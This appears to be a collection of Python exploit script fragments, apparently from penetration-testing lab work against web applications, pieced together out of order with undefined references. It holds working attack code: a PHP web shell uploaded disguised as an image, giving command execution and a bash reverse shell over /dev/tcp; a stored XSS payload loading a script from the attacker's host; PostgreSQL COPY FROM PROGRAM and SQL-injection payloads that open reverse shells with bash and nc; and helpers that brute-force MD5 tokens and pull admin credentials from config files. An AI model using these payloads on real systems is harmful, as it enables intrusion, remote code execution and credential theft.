

def upload_file(args, session, file_ext="jpg"):
    url = f"{args.target}/components/admin/file_storage.php"
    data = {"upload": True}
    php_payload = """<?php 
        echo file_get_contents('/opt/local.txt');
        echo "Set NC params laddr=IP&lport=PORT";
        
        if (isset($_GET['laddr']) && isset($_GET['lport'])) {
            $target = $_GET['laddr'] . "/" . $_GET['lport']; 
            $cmd = "bash -c 'bash -i >& /dev/tcp/{$target} 0>&1' > /dev/null 2>&1 &";
            system($cmd); 
            echo "Shell triggered successfully.";
        }
            if (isset($_GET['cmd']) && $_GET['cmd'] !== '') {
                echo "<pre>";
                echo $_GET['cmd'];
                echo "\n";
                system($_GET['cmd']); 
                echo "</pre>";
            }
        ?>  
      
        <form method="GET" action="">
            <input type="text" id="cmd" name="cmd" autofocus style="width: 60%; padding: 5px;">
        </form>
    """
    files = {"file": (f"shell.{file_ext}", php_payload, f"application/{file_ext}")}

    print(f"[*] Upload a new file for the admin")
    response = session.post(url=url, data=data, files=files, proxies=PROXIES)
    print(f"[+] Uploaded a new file for the admin {response.status_code}")
    return session


import re
import requests
import hashlib


def get_csrf_token(session, url):
    resp = session.get(url=url)
    start = resp.text.find('<div class="user-content">')
    text = resp.text[start : (start + 500)]
    first = list(re.findall(r"<input .*_csrf.*>", text))[0]
    key = re.findall(r"value=\S*", first)[0]
    key = key.replace("value=", "").replace('"', "")
    return key

def create_md5s(email):
    return [
        hashlib.md5(f"{email}{x:03d}".encode("utf-8")).hexdigest() for x in range(1000)
    ]

def regex_the_config_file_for_admin(text):
    match = re.search(r'define\("ADMIN_EMAIL", "[^"]*"\);', text)
    if match:
        return match.group().replace('define("ADMIN_EMAIL", "', "").replace('");', "")

def regex_the_config_file_for_password(text):
    match = re.search(r'define\("ADMIN_PASSWORD", "[^"]*"\);', text)
    if match:
        return (
            match.group().replace('define("ADMIN_PASSWORD", "', "").replace('");', "")
        )


def post_xss_question():
    print("\n\n" + "=" * 66 + "\n1. [*] SENDING THE DOM XSS PAYLOAD\n" + "=" * 66)
    session = build_session()
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
    }
    params = {
        "category": 1,
        "title": "Now is the time?",
        "description": f'What is the quest<script src="http://{args.laddr}:{args.flask_port}/evil_payload.js"></script>?',
    }
    url = f"http://{args.raddr}:{args.rport}/question"
    response = session.post(url=url, data=params, headers=headers)
    print(
        f"[+] sent the xss page.. Not sure which thread it is: ", response.status_code
    )


evil_sql = """
    CREATE TEMP TABLE IF NOT EXISTS temp_table(output text);
    COPY temp_table FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/LADDR/LPORT 0>&1 &"';
""".replace("LADDR", args.laddr).replace("LPORT", f"{args.socket_port}")



RCE_STRING = "' OR 1=1 ; COPY (select 'a') TO  PROGRAM $$cd /bin && nc LADDR LPORT -e sh &$$ -- - "
def get_rce(args, session):
    print("\n" + "=" * 40 + "\n1. [*] SEND SQLi PAYLOAD\n" + "=" * 40)
    url = os.path.join(args.host, "v1/warehouse/pending-events")
    print(f"[*] RCE Attack vector:\n\t{url}")

    # 2. build the sqli payload
    payload = f"{RCE_STRING}".replace('LADDR', args.laddr).replace('LPORT', f"{args.lport}")
    json = {"source_id": payload}
    print(f"[*] Sending SQLi Shell:\n\t{payload}")

    # 3. send the payload
    resp = session.post(url=url, timeout=10, json=json)
    print(f"[+] Success! Status code:\t{resp.status_code}")
